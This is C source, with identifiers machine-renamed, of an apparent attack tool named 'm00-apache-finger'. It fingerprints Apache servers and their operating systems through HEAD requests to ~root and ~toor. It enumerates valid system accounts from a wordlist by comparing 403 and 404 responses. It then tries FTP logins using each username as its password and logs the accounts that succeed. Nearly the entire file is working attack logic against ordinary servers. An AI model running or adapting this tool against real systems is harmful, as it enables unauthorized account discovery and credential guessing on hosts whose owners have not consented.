
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 int VAR_0 ;
 int VAR_1 ;
 char VAR_2 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int) ;
 int FUNC_2 (char*,int) ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int *) ;
 int FUNC_5 (char*,int,int *) ;
 int * FUNC_6 (char*,char*) ;
 int FUNC_7 (int *,char*) ;
 char FUNC_8 (int,char**,char*) ;
 int FUNC_9 () ;
 scalar_t__ FUNC_10 (int) ;
 int FUNC_11 (char*,char*,int) ;
 int FUNC_12 (char*,int,int) ;
 char* VAR_3 ;
 int FUNC_13 (char*,...) ;
 int FUNC_14 (int,char*,int,int ) ;
 int FUNC_15 (char*,char*,...) ;
 int FUNC_16 (char*,char*) ;
 int FUNC_17 (char*) ;
 scalar_t__ FUNC_18 (char*,char*) ;
 int FUNC_19 (char*) ;
 int FUNC_20 (char*) ;
 int FUNC_21 (int,char*,int) ;

int FUNC_22(int VAR_4, char *VAR_5[]) {
FILE *VAR_6, *VAR_7;
char *VAR_8=((void*)0);
char *VAR_9=((void*)0);
char *VAR_10=((void*)0);
char VAR_11[0x20], VAR_12[0x20], VAR_13[0xc8], VAR_14[0x3e8], VAR_15,VAR_16[0x30];
int VAR_17,VAR_18,VAR_19,VAR_20,VAR_21=0,VAR_22=0;
int VAR_23 = VAR_1;
int VAR_24 = VAR_0;

char VAR_25[0x05] =
"\x20\x32\x30\x30\x20";
char VAR_26[0x0e] =
"\x34\x30\x33\x20\x46\x6f"
"\x72\x62\x69\x64\x64\x65\x6e";
char VAR_27[0x0e] =
"\x34\x30\x34\x20\x4e\x6f\x74"
"\x20\x46\x6f\x75\x6e\x64";
char VAR_28[0x0f] =
"\x53\x65\x72\x76\x65\x72\x3a"
"\x20\x41\x70\x61\x63\x68\x65";
char *VAR_29 =
"Accept: */*\r\n"
"Accept-Language: en-us,en;q=0.5\r\n"
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
"User-Agent: m00-apache-finger\r\n"
"Connection: close\r\n\r\n";
char **VAR_30;

FUNC_9();

if(VAR_4<2) FUNC_19(VAR_5[0]);
while((VAR_15 = FUNC_8(VAR_4, VAR_5, "t:u:hp:vbl:"))!= VAR_2) {
switch (VAR_15) {
case 't':
VAR_10=VAR_3;
break;
case 'u':
VAR_8=VAR_3;
break;
case 'p':
VAR_23=FUNC_0(VAR_3);
break;
case 'l':
VAR_9=VAR_3;
break;
case 'b':
VAR_22=1;
break;
case 'v':
VAR_21=1;
break;
case 'h':
FUNC_19(VAR_5[0]);
return 1;
default:
FUNC_19(VAR_5[0]);
return 1;
}
}

if(VAR_10==((void*)0)) { FUNC_19(VAR_5[0]); }
if(VAR_8==((void*)0)) { FUNC_19(VAR_5[0]); }

if(VAR_9 && (VAR_7 = FUNC_6(VAR_9, "a")) == 0) {
FUNC_13("[-] unable to open logfile [%s]\n",VAR_9);
FUNC_3(0);
}

if((VAR_6 = FUNC_6(VAR_8, "r")) == 0) {
FUNC_13("[-] unable to open userlist [%s]\n",VAR_8);
FUNC_3(0);
}

VAR_30 = (char **)FUNC_10(0x666);

FUNC_13("[*] Checking http server [%s:%i]...\n",VAR_10,VAR_23);

VAR_18 = FUNC_2(VAR_10,VAR_23);
FUNC_15(VAR_13,"HEAD /~root HTTP/1.1\r\nHost: %s\r\n%s",VAR_10,VAR_29);

FUNC_21(VAR_18,VAR_13,FUNC_17(VAR_13));
FUNC_14(VAR_18,VAR_14,0x3e8,0);

if(VAR_21) FUNC_20(VAR_14);

FUNC_13(" Apache => ");
if(!FUNC_18(VAR_14,VAR_28)) { FUNC_13(" no\n Vulnerable => "); } else FUNC_13(" yes\n Vulnerable => ");
if(!FUNC_18(VAR_14,VAR_26)) { FUNC_13("no\n[-] Exiting...\n"); FUNC_3(0); } else FUNC_13("yes\n");
FUNC_1(VAR_18);

VAR_18 = FUNC_2(VAR_10,VAR_23);
FUNC_15(VAR_13,"HEAD /~toor HTTP/1.1\r\nHost: %s\r\n%s",VAR_10,VAR_29);
FUNC_21(VAR_18,VAR_13,FUNC_17(VAR_13));
FUNC_14(VAR_18,VAR_14,0x3e8,0);

if(VAR_21) FUNC_20(VAR_14);

FUNC_13(" OS => ");
if(FUNC_18(VAR_14,VAR_26)) { FUNC_13("FreeBSD"); } else {
if(FUNC_18(VAR_14,"Unix")) FUNC_13("Unix unknow");
if(FUNC_18(VAR_14,"Debian")) FUNC_13("Debian Linux");
if(FUNC_18(VAR_14,"RedHat")) FUNC_13("RedHat Linux");
if(FUNC_18(VAR_14,"mdk")) FUNC_13("Mandrake Linux");
}
FUNC_1(VAR_18);

FUNC_13("\n[*] Searching for system accounts...");

if(VAR_9) {
FUNC_15(VAR_16,"Host: %s\nFound accounts:\n",VAR_10);
FUNC_7(VAR_7,VAR_16);
}

VAR_19=0;
VAR_20=0;
while (1) {
FUNC_5(VAR_11, 32, VAR_6);
if (VAR_11[0] == '\n' || FUNC_18(VAR_12,VAR_11)) break;
FUNC_16(VAR_12,VAR_11);
VAR_11[FUNC_17(VAR_11)-1] = '\0';
VAR_19++;

FUNC_13("\n %s \t=> ",VAR_11);


VAR_18 = FUNC_2(VAR_10,VAR_23);
FUNC_15(VAR_13,"HEAD /~%s HTTP/1.1\r\nHost: %s\r\n%s",VAR_11,VAR_10,VAR_29);

FUNC_21(VAR_18,VAR_13,FUNC_17(VAR_13));
FUNC_14(VAR_18,VAR_14,0x3e8,0);

if(VAR_21) FUNC_20(VAR_14);

if(!FUNC_18(VAR_14,VAR_27)) {
FUNC_13(" yes",VAR_11);
if(VAR_9) {
FUNC_15(VAR_16,"%s\n",VAR_11);
FUNC_7(VAR_7,VAR_16);
}
VAR_30[VAR_20] = (char *)FUNC_10(FUNC_17(VAR_11));
FUNC_11(VAR_30[VAR_20],VAR_11,FUNC_17(VAR_11));
FUNC_12(VAR_30[VAR_20]+FUNC_17(VAR_11),0x0,1);
VAR_20++;
}
FUNC_1(VAR_18);
}
FUNC_4(VAR_6);
FUNC_13("\n[*] Searching complete.\n");
FUNC_13(" %i users checked\n %i users found\n",VAR_19,VAR_20);
if(VAR_22 && VAR_20>0) {
VAR_19=0;
VAR_17=0;
if(VAR_9) {
FUNC_15(VAR_16,"FTP:\n");
FUNC_7(VAR_7,VAR_16);
}
FUNC_13("[*] Attempting to log on ftp with login:login...\n");
while(VAR_19!=VAR_20) {
FUNC_13(" %s:%s \t=>",VAR_30[VAR_19],VAR_30[VAR_19]);
VAR_18 = FUNC_2(VAR_10,VAR_24);

FUNC_15(VAR_13,"USER %s\n",VAR_30[VAR_19]);
FUNC_21(VAR_18,VAR_13,FUNC_17(VAR_13));
FUNC_14(VAR_18,VAR_14,0x3e8,0);

FUNC_15(VAR_13,"PASS %s\n",VAR_30[VAR_19]);
FUNC_21(VAR_18,VAR_13,FUNC_17(VAR_13));
FUNC_14(VAR_18,VAR_14,0x3e8,0);
if(FUNC_18(VAR_14,"230")) {
FUNC_13(" yes\n");
if(VAR_9) {
FUNC_15(VAR_16,"%s:%s\n",VAR_30[VAR_19],VAR_30[VAR_19]);
FUNC_7(VAR_7,VAR_16);
}
VAR_17++;
} else FUNC_13(" no\n");
FUNC_1(VAR_18);
VAR_19++;
}
FUNC_13("[*] Complete.\n");
FUNC_13(" %i ftp accounts found\n",VAR_17);
}
if(VAR_9) {
FUNC_7(VAR_7,"\n");
FUNC_4(VAR_7);
}

}
